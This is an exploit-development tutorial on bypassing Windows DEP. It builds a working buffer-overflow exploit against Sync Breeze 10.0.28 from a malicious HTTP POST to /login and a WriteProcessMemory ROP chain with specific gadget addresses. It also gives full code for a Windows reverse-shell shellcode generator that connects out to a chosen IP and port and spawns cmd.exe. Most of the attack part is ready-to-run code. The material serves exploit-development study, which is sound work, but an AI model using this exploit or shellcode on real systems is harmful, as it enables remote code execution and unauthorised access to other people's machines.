## Bypassing DEP

## What is DEP?

In Windows binary exploitation, **DEP** stands for **Data Execution Prevention**. DEP is a security feature introduced by Microsoft to prevent certain types of exploits, particularly those that attempt to execute code from areas of memory that should only contain data. By marking these areas as non-executable, DEP mitigates risks from buffer overflows and similar memory corruption attacks that often inject malicious code into the stack, heap, or other data sections.

### How DEP Works
1. **Memory Marking**: DEP designates specific memory regions as *non-executable*, so code cannot be executed from these areas. For example:
   - **Stack** and **Heap** regions are typically marked as non-executable.
   - **Code** segments, where legitimate executable code resides, are marked as executable.

2. **Hardware and Software DEP**:
   - **Hardware-enforced DEP**: Uses the CPU’s No-Execute (NX) bit, which marks memory pages as executable or non-executable. This provides robust protection since it leverages CPU hardware.
   - **Software-enforced DEP**: Monitors and prevents certain actions in Windows, but without hardware support, it’s less effective.

### DEP in Exploitation Mitigation
DEP makes it much harder for attackers to execute their payload directly in memory regions meant for data storage. Without DEP, a typical exploit might:
   1. Overflow a buffer on the stack or heap.
   2. Inject malicious code into that area.
   3. Redirect execution to this injected code.

With DEP enabled, the injected code on the stack or heap cannot be executed, as these areas are marked non-executable. This forces attackers to find alternative methods, such as **Return-Oriented Programming (ROP)**, where they use existing executable code snippets to build their payload indirectly.

### Bypassing DEP
While DEP is a strong deterrent, advanced exploit techniques can bypass it:
   - **Return-Oriented Programming (ROP)**: This technique leverages "gadgets"—small instruction sequences ending in a return statement—found in legitimate executable code. By chaining these gadgets, attackers can create complex payloads without needing to inject new executable code.
   - **Memory Corruption in DEP-enabled Code Segments**: If attackers can manipulate function pointers or other control data within executable memory, they may still execute malicious sequences.

### DEP and Exploitation
DEP was a game-changer in making exploits more challenging, especially when combined with other mitigations like **ASLR** (Address Space Layout Randomization). These technologies together increase the difficulty of reliably exploiting vulnerabilities, as they prevent straightforward code injection and make payload development more complex.

## Exploiting Sync Breeze 10.0.28

In this case, we will start by providing an exploit that already includes the offset to reach EIP and the bad characters. This way, we will speed up the process and focus on what’s important.

```py
#!/usr/bin/env python3
import socket, sys
from struct import pack

def exploit():
    try:
        server = sys.argv[1]
        port = 80

        size = 800
        offset = 780

        shellcode = b""
        
        # badchars --> \x00\x0a\x0d\x25\x26\x2b\x3d

        filler = b"A" * offset
        eip = b"B" * 4

        inputBuffer = filler + eip

        content = b"username=" + inputBuffer + b"&password=A"
        buffer = b"POST /login HTTP/1.1\r\n"
        buffer += b"Host: " + server.encode() + b"\r\n"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
        buffer += b"\r\n"
        buffer += content

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buffer)
            s.close()
            print(f"[*] Malicious payload sent")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    exploit()

```

If we send the exploit we can see four "B" characters at "eip" register. Now we have to begin with the DEP bypassing.

To bypass DEP, we can use several functions of Windows API like "VirtualAlloc", "VirtualProtect", or "WriteProcessMemory". In this case we have selected the "WriteProcessMemory" way.

### What is WriteProcessMemory?

WriteProcessMemory is a Windows API function used to write data to a specific area of memory in a process running on the Windows operating system.

```
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);

```


- `hProcess` is a handle to the process memory to be modified. since we will be using the same current process the value will be -1 or 0xFFFFFFFF and this is called pseudo handle.
- `lpBaseAddress` A pointer to a place / buffer and it’s called code cave in the memory where our shellcode will be writtren in.
- `lpBuffer` This is basically the address of the shellcode, our shellcode will be in the lpBuffer and WPM will copy the shellcode from the lpBuffer and write to the address in lpBaseAddress
- `nSize` This specifis the size of the shellcode and it must be same size as the shellcode or bigger.
- `lpNumberOfBytesWritten` basically an optional argument and it can be NULL. It’s a pointer to a variable that receives the number of bytes transferred into the specified process by WPM.

As earlier mentioned that lpBaseAddress points to a code cave.

Code cave is an empty/unused memory region getting created by the compiler when compiling the software. This region must have READ & EXECUTE permissions.

We need to push into the stack 7 values: the "WriteProcessMemory" function address, the return address of the function, and the five arguments. For that we will use an skeleton, which are dummy values that are pushed into the stack, then we will modify these values with ROP gadgets, and finally we will call the function with the desired values.

To start with this ROP challenge we have to move the "esp" address to other register to be able to access and modify the values at the stack. The first ROP gadget will be a "push esp" instruction (if it exists). The first step is finding a module in the binary that is not compiled with "ASLR" and that does not have badchars at the address.

![imagen](https://github.com/user-attachments/assets/2ff7392f-af29-4c29-a26d-268b4e43aaad)

Next, we use the following command in WinDbg --> `!nmod`

![imagen](https://github.com/user-attachments/assets/39150fcf-bcf9-4c05-ab7a-c97beb3797c8)

We see that "libspp.dll" is a good candidate, so we are going to use a tool that extracts the gadgets of that module.

![imagen](https://github.com/user-attachments/assets/3135ca51-0736-4036-8930-57925eec0e83)

We find several gadgets:

![imagen](https://github.com/user-attachments/assets/09344cf2-10c8-4535-a1c4-381893f6c442)

The first one has the badchar "0a" so we choose the second one and we add it to the exploit.

![imagen](https://github.com/user-attachments/assets/e3038ebd-c569-406c-837e-4b0e69cf6963)

### Code Cave

We can find the offset to the PE header by dumping the DWORD at offset 0x3C. Next, we’ll add 0x2C to the offset to find the offset to the code section:

![imagen](https://github.com/user-attachments/assets/24f69ca8-c27b-4b95-b6ce-abe3b4ca938a)

We use the following command --> `!address 10001000`

And obtain the following output:

![imagen](https://github.com/user-attachments/assets/5d76357e-e6a6-4e87-9f8a-90d837000a03)

We need to search space for the shellcode:

![imagen](https://github.com/user-attachments/assets/28d83696-c3c7-42d6-afba-19dd748871dc)

![imagen](https://github.com/user-attachments/assets/07e5dd08-0053-457a-8563-972a3561f0f6)

Because of the nullbyte, add 4 to the address 0x10167a00 resulting the address 0x10167a04.

`lpNumberOfBytesWritten` argument needs to be a pointer to a writable DWORD where WriteProcessMemory will store the number of bytes that were copied. We could use a stack address for this pointer, but it’s easier to use an address inside the data section of the module you are using.

We use the `!dh` command to find the data section’s start address, supplying the -a flag to dump the name of the module.

![imagen](https://github.com/user-attachments/assets/36b3ff52-87e2-45f5-86b5-cf587bb55c93)

We need to check the contents of the address to ensure they are not being used and to verify memory protections. Section headers must be aligned on a page boundary, so let’s dump the contents of the address just past the size value.

![imagen](https://github.com/user-attachments/assets/ddd71d00-6142-411e-9cb0-7e87b70d0ab1)

![imagen](https://github.com/user-attachments/assets/f0124769-6cbc-4a76-ba12-e904d8d982cc)

Now we have a problem with the WriteProcessMemory address...

WPM is part of KERNEL32, and KERNEL32 is a system DLL so it has ASLR enabled by default that means the real address of WPM will change each time rebooting the system or the software.
The IAT addresses that point to functions are static meaning the IAT Address of WPM that points to the real WPM is static and won’t change.

So let's inspect the IAT with `!dh -f libspp` command:

![imagen](https://github.com/user-attachments/assets/ff42e42a-8604-44e4-b07a-7fa44ca67fd2)

![imagen](https://github.com/user-attachments/assets/7860cd87-f3b0-4700-9e3a-0a139c81c3be)

As you can see, there is no WriteProcessMemory function in the output so we need to choose another function and calculate the offset to WPM.

![imagen](https://github.com/user-attachments/assets/ee912fb5-989b-4a97-aa9e-6fb56cc04db2)

Let's begin with the ROP. For now we have the following exploit:

```py
#!/usr/bin/env python3
import socket, sys
from struct import pack

def exploit():
    try:
        server = sys.argv[1]
        port = 80

        size = 800
        offset = 780

        shellcode = b"\x90" * 400
        
        # badchars --> \x00\x0a\x0d\x25\x26\x2b\x3d
        # ? KERNEL32!GetLastErrorStub - KERNEL32!WriteProcessMemoryStub 0xfffe2930
        # KERNEL32!GetLastErrorStub IAT address --> 0x10168040
        # CODE CAVE --> 0x10167a04
        # Writable memory address --> 0x1020c044

        #BOOL WriteProcessMemory(
        #    [in]  HANDLE  hProcess,
        #    [in]  LPVOID  lpBaseAddress,
        #    [in]  LPCVOID lpBuffer,
        #    [in]  SIZE_T  nSize,
        #    [out] SIZE_T  *lpNumberOfBytesWritten
        #);

        wpm = pack("<L", 0x43434343)  # dummy WriteProcessMemory Address
        wpm += pack("<L", 0x10167a04) # Return Address after WriteProcessMemory
        wpm += pack("<L", 0xFFFFFFFF) # hProcess
        wpm += pack("<L", 0x10167a04) # lpBaseAddress (Code cave address)
        wpm += pack("<L", 0x46464646) # lpBuffer
        wpm += pack("<L", 0x47474747) # nSize
        wpm += pack("<L", 0x1020c044) # lpNumberOfBytesWritten (Writable memory address)

        filler = b"A" * (offset - len(wpm))

        # PUSH ESP and Realloc
        eip = pack("<L", 0x100bb515)    # push esp; ret ;

        rop = pack("<L", 0x1002f729)    # pop eax; ret ;

        inputBuffer = filler + wpm + eip + rop + shellcode

        content = b"username=" + inputBuffer + b"&password=A"
        buffer = b"POST /login HTTP/1.1\r\n"
        buffer += b"Host: " + server.encode() + b"\r\n"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
        buffer += b"\r\n"
        buffer += content

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buffer)
            s.close()
            print(f"[*] Malicious payload sent")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    exploit()
```

We need to find a gadget that push and pop the esp in the same instruction (because it is better for us than push and pop in different gadgets).

![imagen](https://github.com/user-attachments/assets/ecdba7c5-ee8f-4cf5-b8e6-72e1690b2590)

Now we have to calculate the negative offset between "esi" and our wpm's beginning:

![imagen](https://github.com/user-attachments/assets/5593a8c5-0e64-4fb4-88c6-f0140dc046f9)

![imagen](https://github.com/user-attachments/assets/fe8cab90-463c-4560-9dd4-2aacb4b16f30)

So "esi - 0n36" is the top of our wpm skeleton.

![imagen](https://github.com/user-attachments/assets/f90d2d28-8774-4c43-9e3b-53632c419df1)

Now I want to move the value in EAX to other register, since we use EAX for arithmetic much more.

Our ROP has the following appearance for now:

```py
# PUSH ESP and Realloc
eip = pack("<L", 0x10154112)        # push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret  ;

rop = pack('<L', 0x1013ada1)        # mov eax, esi ; pop esi ; ret
rop += b"A" * 4                     # dummy for the ESI
rop += pack('<L', 0x10151821)       # pop ebp ; ret
rop += pack('<L', 0xffffffdc)       # -0n36
rop += pack('<L', 0x100fcd71)       # add eax, ebp ; dec ecx ; ret
rop += pack("<L", 0x100cb4d4)       # xchg eax, edx ; ret
```

Let's patch WPM address:

![imagen](https://github.com/user-attachments/assets/031dfef4-5c3b-440e-b202-bca88c45f03f)

We have already the WPM address patched, but we have to patch other 2 arguments, so we are going to skip 3 arguments:

![imagen](https://github.com/user-attachments/assets/61bf84d4-0ac3-4aad-859b-852d28385972)

Now we have to patch `lpBuffer`. The whole idea behind lpBuffer is the address of the shellcode, from where the 0x46464646 exists to where the shellcode is stored:

![imagen](https://github.com/user-attachments/assets/219c7cb1-e7ee-4bca-bdb1-151ec77707fb)

Let's patch `nSize` with the size of the shellcode and return to WPM:

![imagen](https://github.com/user-attachments/assets/f5082812-3019-45c4-8111-6d87d81e38e8)

Finally, we have to create a shellcode without badchars, I give you a good shellcoder, but the work of avoid badchars is yours (I want that you try harder as well!):

```py
import ctypes, struct, numpy, sys
from keystone import *

def ror_str(byte, count):
    binb = numpy.base_repr(byte, 2).zfill(32)
    while count > 0:
        binb = binb[-1] + binb[0:-1]
        count -= 1
    return (int(binb, 2))

def push_function_hash(function_name):
    edx = 0x00
    count = 0
    
    for eax in function_name:
        edx = edx + ord(eax)
        if count < len(function_name)-1:
            edx = ror_str(edx, 0xd)
        count += 1
    
    return ("push " + hex(edx))

def hex_ip(ip_address):
    ip_addr_hex = []
    for block in ip_address.split("."):
        ip_addr_hex.append(format(int(block), "02x"))
    ip_addr_hex.reverse()
    return "0x" + "".join(ip_addr_hex)


def hex_port(port):
    port_hex = format(int(port), "04x")
    return "0x" + str(port_hex[2:4]) + str(port_hex[0:2])

def reverse_shell(ip_address, port):
    push_terminateprocess_hash = push_function_hash("TerminateProcess")
    push_loadlibrarya_hash = push_function_hash("LoadLibraryA")
    push_createprocessa_hash = push_function_hash("CreateProcessA")
    push_wsastartup_hash = push_function_hash("WSAStartup")
    push_wsasocketa_hash = push_function_hash("WSASocketA")
    push_wsaconnect_hash = push_function_hash("WSAConnect")

    CODE = [
            "start:                                  ",
            "   mov ebp, esp                        ;",
            "   add esp, 0xfffffdf0                 ;",  #   Avoid NULL bytes

            "find_kernel32:                          ",
            "   xor ecx, ecx                        ;",  #   ECX = 0
            "   mov esi, fs:[ecx+0x30]              ;",  #   ESI = &(PEB)
            "   mov esi, [esi+0x0C]                 ;",  #   ESI = PEB->Ldr
            "   mov esi, [esi+0x1C]                 ;",  #   ESI = PEB->Ldr.InInitOrder

            "next_module:                            ",
            "   mov ebx, [esi+0x8]                  ;",  #   EBX = InInitOrder[x].base_address
            "   mov edi, [esi+0x20]                 ;",  #   EDI = InInitOrder[x].module_name
            "   mov esi, [esi]                      ;",  #   ESI = InInitOrder[x].flink
            "   cmp [edi+12*2], cx                  ;",  #   module_name[12] == 0x00 ?
            "   jne next_module                     ;",  #   jump to the next module

            "find_function_shorten:                  ",
            "   jmp find_function_shorten_bnc       ;",  #   Short jump

            "find_function_ret:                      ",
            "   pop esi                             ;",  #   POP the return address from the stack
            "   mov [ebp+0x04], esi                 ;",  #   Save find_function address for later usage
            "   jmp resolve_symbols_kernel32        ;",

            "find_function_shorten_bnc:              ",
            "   call find_function_ret              ;",  #   Relative CALL with negative offset

            "find_function:                          ",
            "   pushad                              ;",  #   Save all registers
            "   mov eax, [ebx+0x3c]                 ;",  #   Offset to PE Signature
            "   mov edi, [ebx+eax+0x78]             ;",  #   Export Table Directory RVA
            "   add edi, ebx                        ;",  #   Export Table Directory VMA
            "   mov ecx, [edi+0x18]                 ;",  #   NumberOfNames
            "   mov eax, [edi+0x20]                 ;",  #   AddressOfNames RVA
            "   add eax, ebx                        ;",  #   AddressOfNames VMA
            "   mov [ebp-4], eax                    ;",  #   Save AddressOfNames VMA

            "find_function_loop:                     ",
            "   jecxz find_function_finished        ;",  #   jump if ECX == 0
            "   dec ecx                             ;",  #   Decrement names counter
            "   mov eax, [ebp-4]                    ;",  #   Restore AddressOfNames VMA
            "   mov esi, [eax+ecx*4]                ;",  #   RVA of the symbol name
            "   add esi, ebx                        ;",  #   ESI = (VMA of the current symbol name)       

            "compute_hash:                           ", 
            "   xor eax, eax                        ;",  #   EAX = 0
            "   cdq                                 ;",  #   EDX = 0
            "   cld                                 ;",  #   Clear direction flag (DF)

            "compute_hash_again:                     ",
            "   lodsb                               ;",  #   Load the next byte from esi into al
            "   test al, al                         ;",  #   Check for NULL terminator
            "   jz compute_hash_finished            ;",  #   If the ZF is set, we've hit the NULL terminator
            "   ror edx, 0x0d                       ;",  #   Rotate edx 13 bits to the right
            "   add edx, eax                        ;",  #   Add the new byte to the accumulator
            "   jmp compute_hash_again              ;",  #   Next iteration

            "compute_hash_finished:                  ", 
            
            "find_function_compare:                  ",
            "   cmp edx, [esp+0x24]                 ;",  #   Compare hashes
            "   jnz find_function_loop              ;",  #   jump if it does not match
            "   mov edx, [edi+0x24]                 ;",  #   AddressOfNameOrdinals RVA
            "   add edx, ebx                        ;",  #   AddressOfNameOrdinals VMA
            "   mov cx, [edx+2*ecx]                 ;",  #   Extrapolate the function's ordinal
            "   mov edx, [edi+0x1c]                 ;",  #   AddressOfFunctions RVA
            "   add edx, ebx                        ;",  #   AddressOfFunctions VMA
            "   mov eax, [edx+4*ecx]                ;",  #   Get the function RVA
            "   add eax, ebx                        ;",  #   Get the function VMA
            "   mov [esp+0x1c], eax                 ;",
            
            "find_function_finished:                 ",
            "   popad                               ;",  #   Restore registers
            "   ret                                 ;",

            "resolve_symbols_kernel32:               ",
            push_terminateprocess_hash,                  #   TerminateProcess hash
            "   call dword ptr [ebp+0x04]           ;",  #   Call find_function
            "   mov [ebp+0x10], eax                 ;",  #   Save TerminateProcess address for later
            push_loadlibrarya_hash,                      # LoadLibraryA hash
            "       call dword ptr [ebp+0x04]       ;",  # Call find_function
            "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA address for later
            push_createprocessa_hash,                    # CreateProcessA hash
            "       call dword ptr [ebp+0x04]       ;",  # Call find_function
            "       mov [ebp+0x18], eax             ;",  # Save CreateProcessA address for later
            "   load_ws2_32:                         ",
            "       xor eax, eax                    ;",  # Null EAX
            "       mov ax, 0x6c6c                  ;",  # Move the end of the string in AX
            "       push eax                        ;",  # Push EAX on the stack with string NULL terminator
            "       push 0x642e3233                 ;",  # Push part of the string on the stack
            "       push 0x5f327377                 ;",  # Push another part of the string on the stack
            "       push esp                        ;",  # Push ESP to have a pointer to the string
            "       call dword ptr [ebp+0x14]       ;",  # Call LoadLibraryA
            "   resolve_symbols_ws2_32:              ",
            "       mov ebx, eax                    ;",  # Move the base address of ws2_32.dll to EBX
            push_wsastartup_hash,                        # WSAStartup hash
            "       call dword ptr [ebp+0x04]       ;",  # Call find_function
            "       mov [ebp+0x1C], eax             ;",  # Save WSAStartup address for later usage
            push_wsasocketa_hash,                        # WSASocketA hash
            "       call dword ptr [ebp+0x04]       ;",  # Call find_function
            "       mov [ebp+0x20], eax             ;",  # Save WSASocketA address for later usage
            push_wsaconnect_hash,                        # WSAConnect hash
            "       call dword ptr [ebp+0x04]       ;",  # Call find_function
            "       mov [ebp+0x24], eax             ;",  # Save WSAConnect address for later usage
            "   call_wsastartup:                    ;",
            "       mov eax, esp                    ;",  # Move ESP to EAX
            "       xor ecx, ecx                    ;",
            "       mov cx, 0x590                   ;",  # Move 0x590 to CX
            "       sub eax, ecx                    ;",  # Substract CX from EAX to avoid overwriting the structure later
            "       push eax                        ;",  # Push lpWSAData
            "       xor eax, eax                    ;",  # Null EAX
            "       mov ax, 0x0202                  ;",  # Move version to AX
            "       push eax                        ;",  # Push wVersionRequired
            "       call dword ptr [ebp+0x1C]       ;",  # Call WSAStartup
            "   call_wsasocketa:                     ",
            "       xor eax, eax                    ;",  # Null EAX
            "       push eax                        ;",  # Push dwFlags
            "       push eax                        ;",  # Push g
            "       push eax                        ;",  # Push lpProtocolInfo
            "       mov al, 0x06                    ;",  # Move AL, IPPROTO_TCP
            "       push eax                        ;",  # Push protocol
            "       sub al, 0x05                    ;",  # Substract 0x05 from AL, AL = 0x01
            "       push eax                        ;",  # Push type
            "       inc eax                         ;",  # Increase EAX, EAX = 0x02
            "       push eax                        ;",  # Push af
            "       call dword ptr [ebp+0x20]       ;",  # Call WSASocketA
            "   call_wsaconnect:                     ",
            "       mov esi, eax                    ;",  # Move the SOCKET descriptor to ESI
            "       xor eax, eax                    ;",  # Null EAX
            "       push eax                        ;",  # Push sin_zero[]
            "       push eax                        ;",  # Push sin_zero[]
            f"      push {hex_ip(ip_address)}       ;",  # Push address 
            f"      mov ax, {hex_port(port)}        ;",  # Move the port
            "       shl eax, 0x10                   ;",  # Left shift EAX by 0x10 bytes
            "       add ax, 0x02                    ;",  # Add 0x02 (AF_INET) to AX
            "       push eax                        ;",  # Push sin_port & sin_family
            "       push esp                        ;",  # Push pointer to the sockaddr_in structure
            "       pop edi                         ;",  # Store pointer to sockaddr_in in EDI
            "       xor eax, eax                    ;",  # Null EAX
            "       push eax                        ;",  # Push lpGQOS
            "       push eax                        ;",  # Push lpSQOS
            "       push eax                        ;",  # Push lpCalleeData
            "       push eax                        ;",  # Push lpCalleeData
            "       add al, 0x10                    ;",  # Set AL to 0x10
            "       push eax                        ;",  # Push namelen
            "       push edi                        ;",  # Push *name
            "       push esi                        ;",  # Push s
            "       call dword ptr [ebp+0x24]       ;",  # Call WSAConnect
            "   create_startupinfoa:                 ",
            "       push esi                        ;",  # Push hStdError
            "       push esi                        ;",  # Push hStdOutput
            "       push esi                        ;",  # Push hStdInput
            "       xor eax, eax                    ;",  # Null EAX
            "       push eax                        ;",  # Push lpReserved2
            "       push eax                        ;",  # Push cbReserved2 & wShowWindow
            "       mov al, 0x80                    ;",  # Move 0x80 to AL
            "       xor ecx, ecx                    ;",  # Null ECX
            "       mov cl, 0x80                    ;",  # Move 0x80 to CX
            "       add eax, ecx                    ;",  # Set EAX to 0x100
            "       push eax                        ;",  # Push dwFlags
            "       xor eax, eax                    ;",  # Null EAX
            "       push eax                        ;",  # Push dwFillAttribute
            "       push eax                        ;",  # Push dwYCountChars
            "       push eax                        ;",  # Push dwXCountChars
            "       push eax                        ;",  # Push dwYSize
            "       push eax                        ;",  # Push dwXSize
            "       push eax                        ;",  # Push dwY
            "       push eax                        ;",  # Push dwX
            "       push eax                        ;",  # Push lpTitle
            "       push eax                        ;",  # Push lpDesktop
            "       push eax                        ;",  # Push lpReserved
            "       mov al, 0x44                    ;",  # Move 0x44 to AL
            "       push eax                        ;",  # Push cb
            "       push esp                        ;",  # Push pointer to the STARTUPINFOA structure
            "       pop edi                         ;",  # Store pointer to STARTUPINFOA in EDI
            "   create_cmd_string:                   ",
            "       mov eax, 0xff9a879b             ;",  # Move 0xff9a879b into EAX
            "       neg eax                         ;",  # Negate EAX, EAX = 00657865
            "       push eax                        ;",  # Push part of the "cmd.exe" string
            "       push 0x2e646d63                 ;",  # Push the remainder of the "cmd.exe"
            "       push esp                        ;",  # Push pointer to the "cmd.exe" string
            "       pop ebx                         ;",  # Store pointer to the "cmd.exe" string
            "   call_createprocessa:                 ",
            "       mov eax, esp                    ;",  # Move ESP to EAX
            "       xor ecx, ecx                    ;",  # Null ECX
            "       mov cx, 0x390                   ;",  # Move 0x390 to CX
            "       sub eax, ecx                    ;",  # Substract CX from EAX to avoid overwriting the structure later
            "       push eax                        ;",  # Push lpProcessInformation
            "       push edi                        ;",  # Push lpStartupInfo
            "       xor eax, eax                    ;",  # Null EAX
            "       push eax                        ;",  # Push lpCurrentDirectory
            "       push eax                        ;",  # Push lpEnvironment
            "       push eax                        ;",  # Push dwCreationFlags
            "       inc eax                         ;",  # Increase EAX, EAX = 0x01 (TRUE)
            "       push eax                        ;",  # Push bInheritHandles
            "       dec eax                         ;",  # Null EAX
            "       push eax                        ;",  # Push lpThreadAttributes
            "       push eax                        ;",  # Push lpProcessAttributes
            "       push ebx                        ;",  # Push lpCommandLine
            "       push eax                        ;",  # Push lpApplicationName
            "       call dword ptr [ebp+0x18]       ;",  # Call CreateProcessA
            "   exec_shellcode:                      ",
            "       xor ecx, ecx                    ;",  # Null ECX
            "       push ecx                        ;",  # uExitCode
            "       push 0xffffffff                 ;",  # hProcess
            "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
    ]

    return "\n".join(CODE)

def main():
    help_message = "\n[i] Usage: python3 custom_shellcode.py [IP] [Port]"
    
    if (len(sys.argv) != 3):
        print(help_message)
    
    # Initialize engine in X86-32bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)

    encoding, count = ks.asm(reverse_shell(sys.argv[1], sys.argv[2]))
    print("Encoded %d instructions..." % count)

    shellcode = ""

    shellcode += 'shellcode = b"'

    for enc in encoding:
        shellcode += "\\x{0:02x}".format(enc)

    shellcode += '"'

    print(shellcode)

    # CODE USED FOR TESTING, COMMENT OUT TO TEST YOUR SHELLCODE
    
    # ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
    #                                         ctypes.c_int(len(shellcode)),
    #                                         ctypes.c_int(0x3000),
    #                                         ctypes.c_int(0x40))

    # buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    # ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
    #                                     buf,
    #                                     ctypes.c_int(len(shellcode)))

    # print("Shellcode located at address %s" % hex(ptr))
    # input("...ENTER TO EXECUTE SHELLCODE...")

    # ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
    #                                         ctypes.c_int(0),
    #                                         ctypes.c_int(ptr),
    #                                         ctypes.c_int(0),
    #                                         ctypes.c_int(0),
    #                                         ctypes.pointer(ctypes.c_int(0)))

    # ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

main()

```

You need to put your nicely shellcode in the "shellcode" variable. I give to you the final code (without putting the shellcode):

```py
#!/usr/bin/env python3
import socket, sys
from struct import pack

def exploit():
    try:
        server = "127.0.0.1"
        port = 80

        size = 800
        offset = 780

        shellcode = b"\x90" * 400
        
        # badchars --> \x00\x0a\x0d\x25\x26\x2b\x3d
        # ? KERNEL32!GetLastErrorStub - KERNEL32!WriteProcessMemoryStub 0xfffe2930
        # KERNEL32!GetLastErrorStub IAT address --> 0x10168040
        # CODE CAVE --> 0x10167a04
        # Writable memory address --> 0x1020c044

        #BOOL WriteProcessMemory(
        #    [in]  HANDLE  hProcess,
        #    [in]  LPVOID  lpBaseAddress,
        #    [in]  LPCVOID lpBuffer,
        #    [in]  SIZE_T  nSize,
        #    [out] SIZE_T  *lpNumberOfBytesWritten
        #);

        wpm = pack("<L", 0x43434343)  # dummy WriteProcessMemory Address
        wpm += pack("<L", 0x10167a04) # Return Address after WriteProcessMemory
        wpm += pack("<L", 0xFFFFFFFF) # hProcess
        wpm += pack("<L", 0x10167a04) # lpBaseAddress (Code cave address)
        wpm += pack("<L", 0x46464646) # lpBuffer
        wpm += pack("<L", 0x47474747) # nSize
        wpm += pack("<L", 0x1020c044) # lpNumberOfBytesWritten (Writable memory address)

        filler = b"A" * (offset - len(wpm))

        # PUSH ESP and Realloc
        eip = pack("<L", 0x10154112)        # push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret  ;

        rop = pack('<L', 0x1013ada1)        # mov eax, esi ; pop esi ; ret
        rop += b"A" * 4                     # dummy for the ESI
        rop += pack('<L', 0x10151821)       # pop ebp ; ret
        rop += pack('<L', 0xffffffdc)       # -0n36
        rop += pack('<L', 0x100fcd71)       # add eax, ebp ; dec ecx ; ret
        rop += pack("<L", 0x100cb4d4)       # xchg eax, edx ; ret

        # Patching WPM Address
        rop += pack('<L', 0x1012b413)       # pop eax ; ret
        rop += pack('<L', 0xfffe2930)       # negative offset to WPM
        rop += pack('<L', 0x10104df6)       # neg eax ; ret
        rop += pack('<L', 0x1014426e)       # xchg eax, ebp ; ret
        rop += pack('<L', 0x1012b413)       # pop eax ; ret
        rop += pack('<L', 0x10168040)       # IAT Address of KERNEL32!GetLastErrorStub
        rop += pack('<L', 0x1014dc4c)       # mov eax, [eax] ; ret
        rop += pack('<L', 0x100fcd71)       # add eax, ebp ; dec ecx ; ret
        rop += pack('<L', 0x1012d3ce)       # mov dword [edx], eax ; ret
        
        # Skipping 3 arguments
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret
        rop += pack("<L", 0x100bb1f4)       # inc edx ; ret

        # Patching lpBuffer
        rop += pack('<L', 0x1012b413)       # pop eax ; ret
        rop += pack('<L', 0xfffffeff)       # shellcode place - edx = valuate expression: 257 = 00000101
        rop += pack('<L', 0x10104df6)       # neg eax ; ret
        rop += pack('<L', 0x1003f9f9)       # add eax, edx ; retn 0x0004
        rop += pack('<L', 0x1012d3ce)       # mov dword [edx], eax ; ret
        rop += b"A" * 4                     # dummy for the retn
        rop += pack('<L', 0x100bb1f4)       # inc edx ; ret
        rop += pack('<L', 0x100bb1f4)       # inc edx ; ret
        rop += pack('<L', 0x100bb1f4)       # inc edx ; ret
        rop += pack('<L', 0x100bb1f4)       # inc edx ; ret

        # Patching nSize
        rop += pack('<L', 0x1012b413)       # pop eax ; ret
        rop += pack('<L', 0xffffff24)       # -0n220
        rop += pack('<L', 0x10104df6)       # neg eax ; ret
        rop += pack('<L', 0x1012d3ce)       # mov dword [edx], eax ; ret
        
        # Return to WPM
        rop += pack('<L', 0x1012b413)       # pop eax ; ret
        rop += pack('<L', 0xffffffec)       # edx - 0n20 hits WPM
        rop += pack('<L', 0x1003f9f9)       # add eax, edx ; retn 0x0004
        rop += pack('<L', 0x101394a9)       # xchg eax, esp ; ret
        rop += b"A" * 4                     # dummy for the retn


        
        inputBuffer = filler + wpm + eip + rop + shellcode

        content = b"username=" + inputBuffer + b"&password=A"
        buffer = b"POST /login HTTP/1.1\r\n"
        buffer += b"Host: " + server.encode() + b"\r\n"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
        buffer += b"\r\n"
        buffer += content

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server, port))
            s.send(buffer)
            s.close()
            print(f"[*] Malicious payload sent")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    exploit()

```
